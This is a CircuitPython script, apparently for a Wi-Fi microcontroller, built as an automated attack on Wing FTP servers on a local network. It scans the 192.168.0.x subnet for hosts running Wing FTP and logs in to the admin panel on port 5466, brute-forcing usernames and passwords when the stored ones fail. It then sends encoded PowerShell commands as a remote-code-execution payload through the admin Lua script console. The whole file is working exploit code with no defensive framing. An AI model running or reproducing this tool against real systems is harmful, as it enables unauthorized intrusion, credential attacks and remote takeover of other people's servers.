import ipaddress
import ssl
import wifi
import socketpool
import time
import adafruit_requests
from secrets import secrets

pool = socketpool.SocketPool(wifi.radio)
requests = adafruit_requests.Session(pool, ssl.create_default_context())

# This brute force function will only run if the creds in the secrets.py file are invalid
def brute_force(t):
    usernames = secrets["usernames"]
    passwords = secrets["passwords"]

    for u in usernames:
        for p in passwords:
            time.sleep(3)
            data = "username=" + u + "&password=" + p + "&username_val=" + u + "&password_val=" + p + "&submit_btn=+Login+"
            targetlogin = "http://192.168.0." + t + ":5466/admin_loginok.html"
            print("Attempting to login with these credentials " + u + ":" + p + " at " + targetlogin)
            login = requests.post(targetlogin, data=data, stream=False, timeout=1)
            headertest = login.headers
            print(headertest)
            login.close()
            if "set-cookie" in headertest:
                print("Successfully brute forced the Wing FTP admin panel credentials " + u + ":" + p)
                cookie = headertest
                return cookie
    print("Failed to brute force the Wing FTP admin credentials at " + targetlogin)
    cookie = 0
    return cookie

# Connect to wifi
print("Connecting to wifi.")
wifi.radio.connect(secrets["ssid"], secrets["password"])
print("Connected. My IP address is: ", wifi.radio.ipv4_address)


# Data required to authenticate to the Wing FTP admin panel
data = "username=" + secrets["wing_admin"] + "&password=" + secrets["wing_pass"] + "&username_val=" + \
       secrets["wing_admin"] + "&password_val=" + secrets["wing_pass"] + "&submit_btn=+Login+"

# Peform host discovery and see which hosts are running Wing FTP
target_list = []

for octet in range(1,255):
    try:
        iplist = "http://192.168.0." + str(octet)
        print("Scanning the following IP for Wing FTP: http://192.168.0." + str(octet))
        scan = requests.get(iplist, timeout=3, stream=False)
        if scan.headers["server"].find("Wing FTP") >= 0:
            print("Target found at: http://192.168.0." + str(octet))
            target_list.append(str(octet))
        else:
            print("There is a webserver but it is not hosting Wing FTP at: http://192.168.0." + str(octet))
    except RuntimeError:
        print("The following IP is not responding: http://192.168.0." + str(octet))
    except KeyError:
        print("There is a webserver but it is not hosting Wing FTP at: http://192.168.0." + str(octet))

print("The following servers are running Wing FTP: ")
for i in target_list:
    print("http://192.168.0." + str(i))

payload_counter = 0
target_counter = 0

# Authenticate to the Wing FTP admin panel and save the cookie
while True:
    for target in target_list:
        try:
            cookie = ""
            targetlogin = "http://192.168.0." + target + ":5466/admin_loginok.html"
            targetconsole = "http://192.168.0." + target + ":5466/admin_lua_script.html"
            print("Sending login POST request to " +  targetlogin)
            print("Using the following data: " + data)
            login = requests.post(targetlogin, data=data, stream=False, timeout=1)
            cookie = login.headers
            print(cookie)
            login.close()
            if "set-cookie" not in cookie:
                cookie = brute_force(target)
                if cookie != 0:
                    print("Successfully brute forced the admin panel login.")
                else:
                    print("Unable to brute force the admin panel login. Continuing with target list.")
                    continue   
            print(cookie)
          
    # Send the RCE payload
            payload = "command=os.execute('powershell -Encodedcommand " + secrets["command"][payload_counter] + "')"
            print("Printing the final payload:")
            print(payload)
            print("Sending the payload.")
            exploit  = requests.post(targetconsole, data=payload, headers=cookie, stream=False, timeout=1)
            exploit.close()
        
        finally:
            print("Retrying request.")
            time.sleep(3)
    # You can comment the following payload_counter lines out if you only want to run one command repeatedly from your secrets.py file
            payload_counter += 1
            if payload_counter > 5:
                payload_counter = 0
            continue
